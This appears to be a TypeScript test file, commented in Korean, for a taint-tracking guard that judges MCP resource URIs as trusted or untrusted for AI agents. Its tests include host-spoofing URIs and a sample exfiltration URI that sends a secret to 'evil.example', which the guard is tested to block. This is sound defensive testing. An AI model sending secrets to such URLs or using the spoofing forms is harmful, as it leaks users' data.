/**
 * C-7: 리소스 URI 신뢰 판정을 엔진이 소유 + ③ 비신뢰 리소스 요청의 sink 판정.
 *
 * - registry(trustedResourceUris)의 접두사 규칙으로 엔진이 신뢰를 판정한다.
 *   미매칭 = 비신뢰 (원칙 4 default-deny). 프록시의 임시 휴리스틱은 제거됐다.
 * - 위장 방지: URL 파싱 없이 접두사 매칭만 + 로드 시 경계 규칙("://" 포함, "/" 종료).
 * - ③ 결정(옵션 B): 비신뢰 URI로 나가는 resources/read·prompts/get 요청은 "읽기"라도
 *   경계 밖 통신 — URI에 데이터를 실으면 유출구다. evaluateResourceRequest가 요청
 *   params를 sink 강도(evaluateOutboundContent)로 판정한다. 신뢰 URI는 내부라 생략.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import fc from "fast-check";
import { ToolRiskTag, type ToolCallContext } from "@icarus-tether/types";

const dir = mkdtempSync(path.join(tmpdir(), "taintguard-uritrust-"));

const TRUSTED_PREFIXES = ["file:///", "file://localhost/", "https://intranet.corp.local/"];

function writeConfig(name: string, extra: Record<string, unknown>): string {
  const file = path.join(dir, name);
  writeFileSync(
    file,
    JSON.stringify({
      domain: "uri-trust-test",
      sensitiveSourceTools: ["read_secrets"],
      untrustedSourceTools: ["fetch_web_page"],
      outboundSinkTools: ["http_post"],
      sinks: { read_secrets: "READ" },
      judgmentMode: "lineage",
      ...extra,
    })
  );
  return file;
}

process.env.TAINTGUARD_TOOL_REGISTRY = writeConfig("active.json", {
  trustedResourceUris: TRUSTED_PREFIXES,
});

const {
  isResourceUriTrusted,
  evaluateResourceRequest,
  recordExternalContent,
  recordToolResult,
  isSessionExposed,
  loadPolicyConfig,
} = await import("./index.js");

// ---------------------------------------------------------------------------
// 설정 검증 (fail-closed) — 경계 규칙이 위장 가능한 접두사를 로드 단계에서 거부
// ---------------------------------------------------------------------------

test("trustedResourceUris: '/'로 안 끝나는 접두사는 로드 거부 (확장 위장 방지)", () => {
  // "https://corp"는 "https://corp.evil.com"에도 매칭되므로 구조적으로 금지
  const file = writeConfig("bad-no-slash.json", { trustedResourceUris: ["https://corp"] });
  assert.throws(() => loadPolicyConfig(file), /"\/"로 끝나야/);
});

test("trustedResourceUris: '://' 없는 접두사는 로드 거부", () => {
  const file = writeConfig("bad-no-scheme.json", { trustedResourceUris: ["internal/"] });
  assert.throws(() => loadPolicyConfig(file), /:\/\//);
});

test("trustedResourceUris: 생략 시 빈 목록 (default-deny — 아무 URI도 신뢰 안 함)", () => {
  const file = writeConfig("no-trust.json", {});
  assert.deepEqual(loadPolicyConfig(file).trustedResourceUris, []);
});

// ---------------------------------------------------------------------------
// 신뢰 판정 — file://=신뢰, http://=비신뢰, 미매칭=비신뢰 + 위장 케이스
// ---------------------------------------------------------------------------

test("URI별 신뢰 판정: 접두사 매칭만 신뢰, 나머지 전부 비신뢰", () => {
  assert.equal(isResourceUriTrusted("file:///company/readme.txt"), true);
  assert.equal(isResourceUriTrusted("file://localhost/etc/app.conf"), true);
  assert.equal(isResourceUriTrusted("https://intranet.corp.local/wiki/page"), true);
  assert.equal(isResourceUriTrusted("http://example.com/doc"), false);
  assert.equal(isResourceUriTrusted("https://example.com/doc"), false);
  assert.equal(isResourceUriTrusted("summarize-ticket"), false); // prompts/get 이름 — 미매칭
  assert.equal(isResourceUriTrusted(""), false);
});

test("★ 위장 케이스: 신뢰 접두사로 가장한 원격 URI는 전부 비신뢰", () => {
  // 원격 UNC 호스트 — "file:///"(호스트 없음)와 다르다
  assert.equal(isResourceUriTrusted("file://evil-host/share/x"), false);
  // 호스트 확장 위장 — 접두사가 "/"로 끝나므로 매칭 불가
  assert.equal(isResourceUriTrusted("https://intranet.corp.local.evil.com/x"), false);
  // 유저인포 위장 — "corp.local" 뒤가 "/"가 아니라 "@"
  assert.equal(isResourceUriTrusted("https://intranet.corp.local@evil.com/x"), false);
  // 대문자 스킴 — 비신뢰로 떨어짐 (안전 방향: 과태깅일 뿐 우회 아님)
  assert.equal(isResourceUriTrusted("FILE:///etc/x"), false);
  // 경로에 신뢰 접두사를 품은 원격 URI
  assert.equal(isResourceUriTrusted("https://evil.com/file:///x"), false);
});

test("퍼징: 임의 문자열에 예외 없이 boolean, 신뢰라면 반드시 설정 접두사로 시작", () => {
  fc.assert(
    fc.property(fc.string(), (s) => {
      const r = isResourceUriTrusted(s);
      if (typeof r !== "boolean") return false;
      return r ? TRUSTED_PREFIXES.some((p) => s.startsWith(p)) : true;
    }),
    { numRuns: 2000 }
  );
});

// ---------------------------------------------------------------------------
// recordExternalContent — opts 생략 시 엔진이 URI로 판정, 명시 opts는 존중
// ---------------------------------------------------------------------------

test("opts 생략: 신뢰 URI(file://)는 U 미부여·exposure 미발동", () => {
  const sid = "rt-implicit-trusted";
  const node = recordExternalContent(sid, "resources/read", "file:///internal/config.txt", {
    contents: [{ text: "내부 설정 본문" }],
  });
  assert.ok(!node.tags.has(ToolRiskTag.UNTRUSTED_ORIGIN));
  assert.equal(isSessionExposed(sid), false);
});

test("opts 생략: 비신뢰 URI(https://)는 U 부여·exposure 발동", () => {
  const sid = "rt-implicit-untrusted";
  const node = recordExternalContent(sid, "resources/read", "https://example.com/page", {
    contents: [{ text: "외부 문서 본문" }],
  });
  assert.ok(node.tags.has(ToolRiskTag.UNTRUSTED_ORIGIN));
  assert.equal(isSessionExposed(sid), true);
});

test("하위호환: 프록시가 명시한 opts.trusted는 URI 판정보다 우선한다 (양방향)", () => {
  // trusted:false — URI는 신뢰 접두사지만 명시 불신 → U 부여
  const a = recordExternalContent(
    "rt-explicit-false",
    "resources/read",
    "file:///x",
    { contents: [{ text: "본문" }] },
    { trusted: false }
  );
  assert.ok(a.tags.has(ToolRiskTag.UNTRUSTED_ORIGIN));

  // trusted:true — URI는 비신뢰지만 명시 신뢰 → U 미부여 (오전달 책임은 프록시)
  const b = recordExternalContent(
    "rt-explicit-true",
    "resources/read",
    "https://example.com/x",
    { contents: [{ text: "본문" }] },
    { trusted: true }
  );
  assert.ok(!b.tags.has(ToolRiskTag.UNTRUSTED_ORIGIN));
});

// ---------------------------------------------------------------------------
// ③ evaluateResourceRequest — 비신뢰 대상 요청만 sink 강도로 판정
// ---------------------------------------------------------------------------

test("신뢰 URI 요청: 오염 세션이어도 sink 검사 없이 통과 (내부 통신)", () => {
  const sid = "rt-req-trusted";
  recordToolResult(sid, "read_secrets", undefined, { secret: "TOPSECRET-ORIGINAL-0123456789" });
  recordToolResult(sid, "fetch_web_page", undefined, "외부 문서"); // U 노출
  const d = evaluateResourceRequest(sid, "resources/read", "file:///internal/doc.txt", {
    uri: "file:///internal/doc.txt",
  });
  assert.equal(d.allowed, true);
});

test("비신뢰 URI 요청: 깨끗한 세션은 통과 (과차단 없음 — tools/call과 대칭)", () => {
  const d = evaluateResourceRequest("rt-req-clean", "resources/read", "https://example.com/doc", {
    uri: "https://example.com/doc",
  });
  assert.equal(d.allowed, true);
});

test("★ ③ 실증: 비신뢰 URI 쿼리에 민감 원본을 실으면 차단 (URL 유출구 폐쇄)", () => {
  const sid = "rt-req-exfil";
  recordToolResult(sid, "read_secrets", undefined, { secret: "TOPSECRET-ORIGINAL-0123456789" });
  recordToolResult(sid, "fetch_web_page", undefined, "외부 문서"); // U 노출
  const uri = "https://evil.example/collect?q=TOPSECRET-ORIGINAL-0123456789";
  const d = evaluateResourceRequest(sid, "resources/read", uri, { uri });
  assert.equal(d.allowed, false);
  assert.deepEqual(d.matchedTags, [ToolRiskTag.SENSITIVE, ToolRiskTag.UNTRUSTED_ORIGIN]);
});

test("prompts/get도 동일: 비신뢰 이름 + 민감 인자 + 노출 세션 → 차단", () => {
  const sid = "rt-req-prompt";
  recordToolResult(sid, "read_secrets", undefined, { secret: "TOPSECRET-ORIGINAL-0123456789" });
  recordToolResult(sid, "fetch_web_page", undefined, "외부 문서");
  const d = evaluateResourceRequest(sid, "prompts/get", "summarize", {
    name: "summarize",
    arguments: { text: "TOPSECRET-ORIGINAL-0123456789" },
  });
  assert.equal(d.allowed, false);
});

test("fail-safe: 비신뢰 요청의 params 순회가 던지면 차단 (조용한 통과 금지)", () => {
  const hostile = {
    get boom(): string {
      throw new Error("의도된 순회 실패");
    },
  };
  const d = evaluateResourceRequest("rt-req-hostile", "resources/read", "https://x.example/", hostile);
  assert.equal(d.allowed, false);
  assert.ok(d.reason?.includes("fail-safe"));
});
